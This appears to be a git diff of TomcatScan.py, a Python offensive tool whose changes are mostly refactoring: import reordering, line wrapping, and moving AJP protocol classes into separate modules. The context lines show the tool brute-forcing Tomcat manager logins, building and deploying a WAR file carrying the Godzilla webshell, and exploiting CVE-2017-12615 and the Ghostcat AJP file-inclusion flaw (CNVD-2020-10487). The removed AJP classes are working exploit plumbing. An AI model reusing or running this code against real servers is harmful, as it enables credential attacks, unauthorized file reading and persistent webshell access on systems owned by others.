@@ -4,25 +4,25 @@
 # @File    : TomcatScan.py
 # @Project : TomcatScan
 
-import yaml
 import logging
-import requests
-from requests.auth import HTTPBasicAuth
-from colorama import Fore, Style
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import os
-import time
-import re
-from bs4 import BeautifulSoup
-import zipfile
 import random
+import re
 import string
-import socket
 import struct
-from io import BytesIO as StringIO
+import time
+import zipfile
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
 
+import requests
+import yaml
+from bs4 import BeautifulSoup
+from colorama import Fore, Style
+from requests.auth import HTTPBasicAuth
+
 import AjpForwardRequest
+import Tomcat
 
 # 忽略HTTPS请求中的不安全请求警告
 requests.packages.urllib3.disable_warnings()
@@ -30,6 +30,7 @@ requests.packages.urllib3.disable_warnings()
 # 配置日志格式，输出INFO级别及以上的日志消息
 logging.basicConfig(level=logging.INFO, format='%(message)s')
 logger = logging.getLogger()
+
 
 # 加载配置文件
 def load_config(config_file):
@@ -44,6 +45,7 @@ def load_config(config_file):
     """
     with open(config_file, 'r', encoding='utf-8') as file:
         return yaml.safe_load(file)
+
 
 # 通用文件读取函数：用于加载用户名、密码或URL列表文件
 def load_file(file_path):
@@ -62,6 +64,7 @@ def load_file(file_path):
     with open(file_path, 'r', encoding='utf-8') as file:
         return [line.strip() for line in file.readlines()]
 
+
 # 清理URL以确保路径正确
 def clean_url(url):
     """
@@ -75,6 +78,7 @@ def clean_url(url):
     """
     return url.rstrip('/manager/html')
 
+
 # 生成随机的6位数字字母组合，用于WAR包和JSP文件名
 def generate_random_string(length=6):
     """
@@ -87,6 +91,7 @@ def generate_random_string(length=6):
         str: 生成的随机字符串
     """
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
 
 # 生成 WAR 文件，其中包含 Godzilla Webshell
 def generate_war(config):
@@ -120,6 +125,7 @@ def generate_war(config):
     except Exception as e:
         logger.error(f"[-] WAR 包生成失败: {str(e)}")
         return None, None, None
+
 
 # 获取登录后的JSESSIONID和CSRF_NONCE，用于进一步的WAR文件上传
 def get_jsessionid_and_csrf_nonce(url, username, password):
@@ -160,8 +166,10 @@ def get_jsessionid_and_csrf_nonce(url, username, password):
         logger.warning(f"{Fore.YELLOW}[!] 网络错误 {url}: {str(e)}{Style.RESET_ALL}")
         return None, None, None, False
 
+
 # 部署 Godzilla Webshell 并尝试访问上传的 Webshell
-def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file, max_retries, retry_delay):
+def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file,
+                        max_retries, retry_delay):
     """
     部署Godzilla Webshell并尝试访问上传的Webshell。
 
@@ -227,6 +235,7 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
         except OSError as e:
             logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
 
+
 # 弱口令检测函数
 def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
     """
@@ -259,7 +268,8 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
         try:
             for username in usernames:
                 for password in passwords:
-                    response = requests.get(url=url_with_path, auth=HTTPBasicAuth(username, password), headers=headers, timeout=10, verify=False)
+                    response = requests.get(url=url_with_path, auth=HTTPBasicAuth(username, password), headers=headers,
+                                            timeout=10, verify=False)
                     if response.status_code == 200:
                         success_entry = f"{url_with_path} {username}:{password}"
                         logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
@@ -292,6 +302,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
 
     return url, None, None
 
+
 # 动态调整线程池大小，确保资源使用合理
 def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, combination_per_thread):
     """
@@ -315,6 +326,7 @@ def adjust_thread_pool_size(combination_count, max_workers_limit, min_workers, c
     workers = min(calculated_workers, max_workers_limit)
     logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
     return workers
+
 
 def validate_config(config):
     """
@@ -343,6 +355,7 @@ def validate_config(config):
 
     return True
 
+
 def pack_string(s):
     """
     打包字符串，添加长度信息。
@@ -358,6 +371,7 @@ def pack_string(s):
     l = len(s)
     return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)
 
+
 def unpack(stream, fmt):
     """
     解包字节流。
@@ -372,6 +386,7 @@ def unpack(stream, fmt):
     size = struct.calcsize(fmt)
     buf = stream.read(size)
     return struct.unpack(fmt, buf)
+
 
 def unpack_string(stream):
     """
@@ -389,153 +404,6 @@ def unpack_string(stream):
     res, = unpack(stream, "%ds" % size)
     stream.read(1)  # \0
     return res
-
-class NotFoundException(Exception):
-    pass
-
-class AjpBodyRequest:
-    """
-    AJP Body 请求类。
-    """
-    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
-    MAX_REQUEST_LENGTH = 8186
-
-    def __init__(self, data_stream, data_len, data_direction=None):
-        """
-        初始化AjpBodyRequest对象。
-
-        参数:
-            data_stream: 数据流对象
-            data_len: 数据长度
-            data_direction: 数据方向，默认为None
-        """
-        self.data_stream = data_stream
-        self.data_len = data_len
-        self.data_direction = data_direction
-
-    def serialize(self):
-        """
-        序列化数据。
-
-        返回:
-            bytes: 序列化后的数据
-        """
-        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
-        if len(data) == 0:
-            return struct.pack(">bbH", 0x12, 0x34, 0x00)
-        else:
-            res = struct.pack(">H", len(data))
-            res += data
-        if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
-            header = struct.pack(">bbH", 0x12, 0x34, len(res))
-        else:
-            header = struct.pack(">bbH", 0x41, 0x42, len(res))
-        return header + res
-
-    def send_and_receive(self, socket, stream):
-        """
-        发送数据并接收响应。
-
-        参数:
-            socket: 套接字对象
-            stream: 数据流对象
-        """
-        while True:
-            data = self.serialize()
-            socket.send(data)
-            r = AjpResponse.receive(stream)
-            while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
-                r = AjpResponse.receive(stream)
-
-            if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
-                break
-
-
-
-
-
-class AjpResponse:
-    """
-    AJP 响应类。
-    """
-    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
-    COMMON_SEND_HEADERS = [
-        "Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
-        "Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
-    ]
-
-    def parse(self, stream):
-        """
-        解析响应数据。
-
-        参数:
-            stream: 数据流对象
-        """
-        self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")
-
-        if self.prefix_code == AjpResponse.SEND_HEADERS:
-            self.parse_send_headers(stream)
-        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
-            self.parse_send_body_chunk(stream)
-        elif self.prefix_code == AjpResponse.END_RESPONSE:
-            self.parse_end_response(stream)
-        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
-            self.parse_get_body_chunk(stream)
-        else:
-            raise NotImplementedError
-
-    def parse_send_headers(self, stream):
-        """
-        解析发送的响应头。
-        """
-        self.http_status_code, = unpack(stream, ">H")
-        self.http_status_msg = unpack_string(stream)
-        self.num_headers, = unpack(stream, ">H")
-        self.response_headers = {}
-        for i in range(self.num_headers):
-            code, = unpack(stream, ">H")
-            if code <= 0xA000:  # custom header
-                h_name, = unpack(stream, "%ds" % code)
-                stream.read(1)  # \0
-                h_value = unpack_string(stream)
-            else:
-                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]
-                h_value = unpack_string(stream)
-            self.response_headers[h_name] = h_value
-
-    def parse_send_body_chunk(self, stream):
-        """
-        解析发送的响应体块。
-        """
-        self.data_length, = unpack(stream, ">H")
-        self.data = stream.read(self.data_length + 1)
-
-    def parse_end_response(self, stream):
-        """
-        解析结束响应。
-        """
-        self.reuse, = unpack(stream, "b")
-
-    def parse_get_body_chunk(self, stream):
-        """
-        解析获取的响应体块。
-        """
-        rlen, = unpack(stream, ">H")
-        return rlen
-
-    @staticmethod
-    def receive(stream):
-        """
-        接收并解析数据。
-
-        参数:
-            stream: 数据流对象
-        返回:
-            AjpResponse: 解析后的响应对象
-        """
-        r = AjpResponse()
-        r.parse(stream)
-        return r
 
 
 def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
@@ -596,73 +464,6 @@ def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.G
     return fr
 
 
-class Tomcat:
-    """
-    Tomcat类用于建立与Tomcat服务器的连接，并执行HTTP请求。
-
-    属性:
-    - target_host: 目标主机地址。
-    - target_port: 目标主机端口。
-    - socket: 用于与Tomcat服务器通信的socket对象。
-    - stream: 用于读取响应数据的文件对象。
-    """
-    def __init__(self, target_host, target_port):
-        """
-        初始化Tomcat类，建立与目标Tomcat服务器的连接。
-
-        参数:
-        - target_host: 目标主机地址。
-        - target_port: 目标主机端口。
-        """
-        self.target_host = target_host
-        self.target_port = target_port
-
-        # 创建并配置socket对象
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.socket.connect((target_host, target_port))
-        self.stream = self.socket.makefile("rb")
-
-    def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
-        """
-        执行HTTP请求，并返回响应结果。
-
-        参数:
-        - req_uri: 请求的URI。
-        - headers: 请求头字典。
-        - method: HTTP方法，默认为GET。
-        - user: 用户名，用于HTTP认证。
-        - password: 密码，用于HTTP认证。
-        - attributes: 附加属性列表。
-
-        返回:
-        - snd_hdrs_res: 响应头对象。
-        - data_res: 响应数据对象列表。
-        """
-        self.req_uri = req_uri
-        # 准备AJP请求
-        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
-                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))
-        # 设置认证信息
-        if user is not None and password is not None:
-            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
-        # 设置请求头
-        for h in headers:
-            self.forward_request.request_headers[h] = headers[h]
-        # 添加附加属性
-        for a in attributes:
-            self.forward_request.attributes.append(a)
-        # 发送请求并接收响应
-        responses = self.forward_request.send_and_receive(self.socket, self.stream)
-        if len(responses) == 0:
-            return None, None
-        snd_hdrs_res = responses[0]
-        data_res = responses[1:-1]
-        if len(data_res) == 0:
-            print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
-        return snd_hdrs_res, data_res
-
-
 # CVE-2017-12615与CNVD_2020_10487漏洞检测函数
 def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
     """
@@ -717,7 +518,7 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
 
         # 2. 检测CNVD-2020-10487漏洞 (AJP协议漏洞本地文件包含)
         try:
-            parsed_url = urlparse(url) # 解析 URL 并提取主机名
+            parsed_url = urlparse(url)  # 解析 URL 并提取主机名
             target_host = parsed_url.hostname  # 自动去掉端口号
             # 从配置文件中读取 CNVD-2020-10487 的 AJP 端口、文件路径和判断条件
             target_port = config['cnvd_2020_10487']['port']
@@ -737,10 +538,12 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
             if data:
                 result_data = "".join([d.data.decode('utf-8') for d in data])
                 if lfi_check in result_data:
-                    logger.info(f"{Fore.RED}[+] CNVD-2020-10487 本地文件包含成功: {target_host}:{target_port} {Style.RESET_ALL}")
+                    logger.info(
+                        f"{Fore.RED}[+] CNVD-2020-10487 本地文件包含成功: {target_host}:{target_port} {Style.RESET_ALL}")
                     return True, "CNVD-2020-10487", f"ajp://{target_host}:{target_port}/WEB-INF/web.xml"  # 返回漏洞类型和URL
         except Exception as e:
-            logger.warning(f"{Fore.GREEN}[-] 失败: CNVD-2020-10487 {Fore.BLUE}{url} {Fore.YELLOW}{str(e)} {Style.RESET_ALL}")
+            logger.warning(
+                f"{Fore.GREEN}[-] 失败: CNVD-2020-10487 {Fore.BLUE}{url} {Fore.YELLOW}{str(e)} {Style.RESET_ALL}")
 
         return False, None, None  # 如果两个漏洞都未被利用成功，返回默认的失败值
 
